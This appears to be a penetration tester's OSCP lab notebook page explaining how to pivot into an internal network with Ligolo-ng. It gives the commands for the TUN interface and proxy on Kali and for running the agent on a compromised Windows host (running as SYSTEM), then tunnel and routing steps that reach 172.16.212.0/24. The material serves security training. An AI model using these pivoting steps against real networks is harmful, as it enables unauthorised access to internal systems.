public:: true

- ![image.png](../assets/image_1700209566785_0.png){:height 74, :width 280} 
  An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.
- Download Ligolo-ng artifacts from the [GH release page](https://github.com/nicocha30/ligolo-ng/releases)
	- Download the proxy *(AKA server)* for our Kali Linux from
	- Download the agent *(AKA client)* for the platform/arch we want to pivot from
- Server configuration
	- First we need to create a dedicated TUN interface.
	  ```bash
	  sudo ip tuntap add user crazybyte mode tun ligolo
	  sudo ip link set ligolo up
	  ```
	  *This requires privileged capabilities to create the tun interface. Since it's almost always done on Kali that's not an issue.*
	- Start the server
	  ```bash
	  ./proxy -selfcert
	  ```
	- The by default it starts listening on all interfaces on port `11601`. This can be changed via the the `-laddr` option.
	  ```bash
	  ./proxy -selfcert -laddr 192.168.45.183:11601
	  ```
- Client configuration
	- Upload the agent to the target machine
	- Start the agent
	  *The agent can ran from unprivileged users on any supported platform.*
		- On Linux
		  ```bash
		  ./agent -ignore-cert -connect 192.168.45.183:11601
		  ```
		- On Windows
		  ```powershell
		  .\agent.exe -ignore-cert -connect 192.168.45.183:11601
		  ```
	- If everything went fine you should see the agent joining on the ligolo-ng server console
	  ```
	  ┌──(crazybyte㉿kali)-[~/OSCP/Labs/MEDTECH]
	  └─$ ./proxy -selfcert -laddr 192.168.45.183:11601
	  WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
	  INFO[0000] Listening on 192.168.45.183:11601             
	      __    _             __                                                                          
	     / /   (_)___ _____  / /___        ____  ____ _
	    / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
	   / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                    
	  /_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                     
	          /____/                          /____/                                                      
	                                                                                                      
	  Made in France ♥ by @Nicocha30!                                                                     
	                                                                                                      
	  ligolo-ng » INFO[0605] Agent joined.                                 name="NT AUTHORITY\\SYSTEM@WEB02" remote="192.168.212.121:52145"
	  ligolo-ng » 
	  ```
- Start tunnelling from Kali through the client
	- Lets consider that we got access to `192.168.212.121` *(our target machine)* and we successfully deployed our ligolo-ng client there. We then realize that the breached machine has an additional network interface which provides access to an internal network on the segment `172.16.212.0/24`.
	  Our Kali (attacker machine) has no access to the new discovered network, so we can configure `192.168.212.121` to act as proxy for us with the ligolo-ng agent.
		- Lets first `start` the tunnel between our new joined agent and the proxy
		  ```
		  ligolo-ng » INFO[3245] Agent joined.                                 name="NT AUTHORITY\\SYSTEM@WEB02" remote="192.168.212.121:52154"
		  ligolo-ng » session
		  ? Specify a session : 2 - NT AUTHORITY\SYSTEM@WEB02 - 192.168.212.121:52154
		  [Agent : NT AUTHORITY\SYSTEM@WEB02] » ifconfig
		  ┌───────────────────────────────────────────────┐
		  │ Interface 0                                   │
		  ├──────────────┬────────────────────────────────┤
		  │ Name         │ Ethernet0                      │
		  │ Hardware MAC │ 00:50:56:9e:1e:11              │
		  │ MTU          │ 1500                           │
		  │ Flags        │ up|broadcast|multicast|running │
		  │ IPv4 Address │ 192.168.212.121/24             │
		  └──────────────┴────────────────────────────────┘
		  ┌───────────────────────────────────────────────┐
		  │ Interface 1                                   │
		  ├──────────────┬────────────────────────────────┤
		  │ Name         │ Ethernet1                      │
		  │ Hardware MAC │ 00:50:56:9e:ab:72              │
		  │ MTU          │ 1500                           │
		  │ Flags        │ up|broadcast|multicast|running │
		  │ IPv4 Address │ 172.16.212.254/24              │
		  └──────────────┴────────────────────────────────┘
		  [Agent : NT AUTHORITY\SYSTEM@WEB02] » start
		  [Agent : NT AUTHORITY\SYSTEM@WEB02] » INFO[3263] Starting tunnel to NT AUTHORITY\SYSTEM@WEB02 
		  ```
		- Now we just need to instruct our Kali that it can reach `172.16.212.0/24` via the `ligolo` tun interface, by adding a dedicated route.
		  id:: 655732a5-b8af-4b92-b83d-83506e81d6a7
		  ```bash
		  sudo ip route add 172.16.212.0/24 dev ligolo
		  ```
- Limitation
  #+BEGIN_CAUTION
  Please consider the following tool limitation while interacting with ligolo-ng!
  #+END_CAUTION
	- Because the agent is running without privileges, **it's not possible to forward raw packets**. When you perform a NMAP SYN-SCAN, a TCP connect() is performed on the agent.
		- When using nmap, you should use `--unprivileged` or `-PE` to avoid false positives.
	- Supported protocols/packets
		- TCP
		- UDP
		- ICMP (echo requests)